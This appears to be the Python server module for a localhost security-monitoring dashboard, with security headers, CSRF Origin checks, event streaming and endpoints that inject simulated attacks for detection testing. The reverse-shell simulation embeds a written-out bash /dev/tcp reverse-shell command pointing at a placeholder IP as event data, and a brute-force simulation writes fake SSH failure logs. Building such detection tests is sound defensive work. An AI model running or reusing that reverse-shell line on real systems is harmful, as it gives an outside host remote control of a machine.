"""Hardened localhost aiohttp server for the auto-sentinel SOC dashboard.

Security controls:
- Binds strictly to 127.0.0.1 (no unauthenticated LAN exposure).
- Enforces strict Content-Security-Policy (no inline scripts/styles),
  X-Content-Type-Options, Referrer-Policy, and X-Frame-Options headers.
- Enforces Origin-header CSRF protection on all state-changing POST endpoints.
- Uses Server-Sent Events (SSE) backed by bounded EventHub subscriber queues.
"""

import asyncio
import json
import random
from datetime import datetime, timezone
from pathlib import Path
from typing import TYPE_CHECKING, Awaitable, Callable, Dict
from aiohttp import web

from auto_sentinel.dashboard.hub import EventHub
from auto_sentinel.models import EventType, SecurityEvent

if TYPE_CHECKING:
    from auto_sentinel.main import AutoSentinelEngine

STATIC_DIR = Path(__file__).resolve().parent / "static"

SECURITY_HEADERS: Dict[str, str] = {
    "Content-Security-Policy": "default-src 'self'; style-src 'self'; script-src 'self'; connect-src 'self'",
    "X-Content-Type-Options": "nosniff",
    "Referrer-Policy": "no-referrer",
    "X-Frame-Options": "DENY",
}

SIM_USERS = ("root", "admin", "oracle", "test")


def create_app(
    engine: "AutoSentinelEngine",
    hub: EventHub,
    host: str = "127.0.0.1",
    port: int = 8765,
) -> web.Application:
    """Construct and configure the hardened aiohttp dashboard Application."""
    allowed_origins = {
        f"http://{host}:{port}",
        f"http://127.0.0.1:{port}",
        f"http://localhost:{port}",
    }

    @web.middleware
    async def csrf_origin_middleware(
        request: web.Request,
        handler: Callable[[web.Request], Awaitable[web.StreamResponse]],
    ) -> web.StreamResponse:
        if request.method == "POST":
            origin = request.headers.get("Origin")
            if origin is not None and origin.rstrip("/") not in allowed_origins:
                return web.json_response(
                    {"error": "Forbidden: invalid Origin header"},
                    status=403,
                )
        return await handler(request)

    async def apply_security_headers(
        request: web.Request,
        response: web.StreamResponse,
    ) -> None:
        response.headers.update(SECURITY_HEADERS)

    app = web.Application(middlewares=[csrf_origin_middleware])
    app.on_response_prepare.append(apply_security_headers)

    async def index(_request: web.Request) -> web.FileResponse:
        return web.FileResponse(STATIC_DIR / "index.html")

    async def get_state(_request: web.Request) -> web.Response:
        intact, count = engine.ledger.verify_integrity()
        capacity = getattr(engine.queue._queue, "maxsize", 1000)
        payload = hub.snapshot(
            queue_depth=engine.queue.qsize(),
            queue_capacity=capacity,
            ledger_intact=intact,
            ledger_count=count,
        )
        payload["meta"] = {
            "log_file": str(engine.log_file),
            "ledger_file": str(engine.ledger_file),
            "dry_run": engine.dry_run,
        }
        return web.json_response(payload)

    async def stream_events(request: web.Request) -> web.StreamResponse:
        response = web.StreamResponse(
            status=200,
            reason="OK",
            headers={
                "Content-Type": "text/event-stream",
                "Cache-Control": "no-cache",
                "Connection": "keep-alive",
                "X-Accel-Buffering": "no",
            },
        )
        await response.prepare(request)

        sub_queue = hub.subscribe()
        try:
            while True:
                try:
                    msg = await asyncio.wait_for(sub_queue.get(), timeout=15.0)
                    chunk = f"data: {json.dumps(msg)}\n\n".encode("utf-8")
                    await response.write(chunk)
                except asyncio.TimeoutError:
                    await response.write(b": ping\n\n")
        except (asyncio.CancelledError, ConnectionResetError, BrokenPipeError):
            pass
        finally:
            hub.unsubscribe(sub_queue)
        return response

    async def simulate_bruteforce(_request: web.Request) -> web.Response:
        user = random.choice(SIM_USERS)
        ip = f"203.0.113.{random.randint(10, 240)}"
        ts = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
        lines = [
            f"{ts} srv sshd[{1100 + i}]: Failed password for invalid user {user} from {ip} port 22 ssh2\n"
            for i in range(5)
        ]
        with open(engine.log_file, "a", encoding="utf-8") as fp:
            fp.writelines(lines)
            fp.flush()
        return web.json_response({"status": "ok", "ip": ip, "user": user, "lines": 5})

    async def simulate_reverse_shell(_request: web.Request) -> web.Response:
        pid = random.randint(20000, 60000)
        cmd = "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"
        event = SecurityEvent(
            event_type=EventType.PROCESS_SPAWNED,
            source="simulation",
            process_name="bash",
            process_pid=pid,
            raw_message=f"Parent=nginx spawned Child=bash (cmd={cmd})",
            metadata={"parent_name": "nginx", "cmdline": cmd.split(), "simulated": True},
        )
        await engine.queue.put(event)
        return web.json_response({"status": "ok", "pid": pid, "process": "bash"})

    async def verify_ledger(_request: web.Request) -> web.Response:
        intact, count_or_id = engine.ledger.verify_integrity()
        return web.json_response({"intact": intact, "count_or_id": count_or_id})

    app.router.add_get("/", index)
    app.router.add_static("/static/", STATIC_DIR, show_index=False)
    app.router.add_get("/api/state", get_state)
    app.router.add_get("/api/stream", stream_events)
    app.router.add_post("/api/simulate/bruteforce", simulate_bruteforce)
    app.router.add_post("/api/simulate/reverse-shell", simulate_reverse_shell)
    app.router.add_post("/api/ledger/verify", verify_ledger)

    return app
